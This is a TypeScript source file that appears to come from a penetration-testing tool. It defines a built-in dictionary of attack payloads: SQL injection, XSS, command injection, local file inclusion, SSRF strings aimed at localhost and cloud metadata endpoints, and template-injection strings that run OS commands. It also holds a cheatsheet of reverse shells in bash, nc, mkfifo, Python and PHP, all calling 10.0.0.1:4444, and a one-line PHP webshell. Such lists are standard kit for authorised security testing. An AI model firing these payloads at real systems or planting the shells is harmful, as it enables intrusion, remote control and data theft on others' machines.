/**
 * 内置 payload 字典。仅作为渗透测试时的速查/插入素材。
 */

export interface PayloadItem {
  id: string
  value: string
  note?: string
}

export interface PayloadGroup {
  id: string
  items: PayloadItem[]
  /** cheatsheet 类型的条目是长文本备忘，不适合直接插入参数 */
  kind?: 'payload' | 'cheatsheet'
}

export const BUILTIN_PAYLOADS: PayloadGroup[] = [
  {
    id: 'sqli',
    items: [
      { id: 's1', value: "' OR 1=1-- -" },
      { id: 's2', value: "' OR '1'='1" },
      { id: 's3', value: "admin'-- -" },
      { id: 's4', value: "' OR 1=1#" },
      { id: 's5', value: "' AND SLEEP(5)-- -" },
      { id: 's6', value: "' UNION SELECT 1,2,3-- -" },
      { id: 's7', value: "' UNION SELECT NULL,NULL,NULL-- -" },
      { id: 's8', value: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -" },
      { id: 's9', value: "' AND 1=1-- -" },
      { id: 's10', value: "' AND 1=2-- -" },
      { id: 's11', value: "' OR SLEEP(5)#" },
      { id: 's12', value: "1' AND '1'='1" },
    ],
  },
  {
    id: 'xss',
    items: [
      { id: 'x1', value: '<script>alert(1)</script>' },
      { id: 'x2', value: '<img src=x onerror=alert(1)>' },
      { id: 'x3', value: '<svg onload=alert(1)>' },
      { id: 'x4', value: 'javascript:alert(1)' },
      { id: 'x5', value: '"><script>alert(1)</script>' },
      { id: 'x6', value: "'-alert(1)-'" },
      { id: 'x7', value: '<body onload=alert(1)>' },
      { id: 'x8', value: '<iframe src="javascript:alert(1)"></iframe>' },
      { id: 'x9', value: '<details open ontoggle=alert(1)>' },
      { id: 'x10', value: '"><img src=x onerror=alert(document.domain)>' },
      { id: 'x11', value: '<a href="javascript:alert(1)">click</a>' },
      { id: 'x12', value: '<svg><script>alert&#40;1&#41;</script></svg>' },
    ],
  },
  {
    id: 'cmdi',
    items: [
      { id: 'c1', value: ';id' },
      { id: 'c2', value: '|id' },
      { id: 'c3', value: '||id' },
      { id: 'c4', value: '&&id' },
      { id: 'c5', value: '`id`' },
      { id: 'c6', value: '$(id)' },
      { id: 'c7', value: '%0aid' },
      { id: 'c8', value: ';whoami' },
      { id: 'c9', value: '|ping -c 2 127.0.0.1' },
      { id: 'c10', value: ';curl http://127.0.0.1:8080/`id`' },
    ],
  },
  {
    id: 'lfi',
    items: [
      { id: 'l1', value: '../../../../etc/passwd' },
      { id: 'l2', value: '....//....//....//etc/passwd' },
      { id: 'l3', value: '/etc/passwd%00' },
      { id: 'l4', value: 'php://filter/convert.base64-encode/resource=index.php' },
      { id: 'l5', value: 'php://filter/read=string.toupper/resource=index.php' },
      { id: 'l6', value: 'file:///etc/passwd' },
      { id: 'l7', value: 'expect://id' },
      { id: 'l8', value: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+' },
      { id: 'l9', value: 'C:\\Windows\\win.ini' },
      { id: 'l10', value: '/proc/self/environ' },
    ],
  },
  {
    id: 'ssrf',
    items: [
      { id: 'r1', value: 'http://127.0.0.1:80' },
      { id: 'r2', value: 'http://localhost:8080/admin' },
      { id: 'r3', value: 'http://169.254.169.254/latest/meta-data/' },
      { id: 'r4', value: 'http://metadata.google.internal/computeMetadata/v1/' },
      { id: 'r5', value: 'http://[::1]:80' },
      { id: 'r6', value: 'http://0.0.0.0:22' },
      { id: 'r7', value: 'file:///etc/passwd' },
      { id: 'r8', value: 'gopher://127.0.0.1:6379/_PING%0D%0A' },
      { id: 'r9', value: 'dict://127.0.0.1:11211/stat' },
    ],
  },
  {
    id: 'ssti',
    items: [
      { id: 't1', value: '{{7*7}}' },
      { id: 't2', value: '${7*7}' },
      { id: 't3', value: '#{7*7}' },
      { id: 't4', value: '<%= 7*7 %>' },
      { id: 't5', value: '{{config}}' },
      { id: 't6', value: "{{''.__class__.__mro__[1].__subclasses__()}}" },
      { id: 't7', value: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" },
      { id: 't8', value: '${"freemarker.template.utility.Execute"?new()("id")}' },
    ],
  },
  {
    id: 'shell',
    kind: 'cheatsheet',
    items: [
      { id: 'h1', value: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", note: 'bash' },
      { id: 'h2', value: "nc -e /bin/sh 10.0.0.1 4444", note: 'nc' },
      { id: 'h3', value: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f", note: 'mkfifo' },
      { id: 'h4', value: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'", note: 'python' },
      { id: 'h5', value: "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", note: 'php' },
      { id: 'h6', value: "<?php system($_GET['c']); ?>", note: 'webshell' },
    ],
  },
]
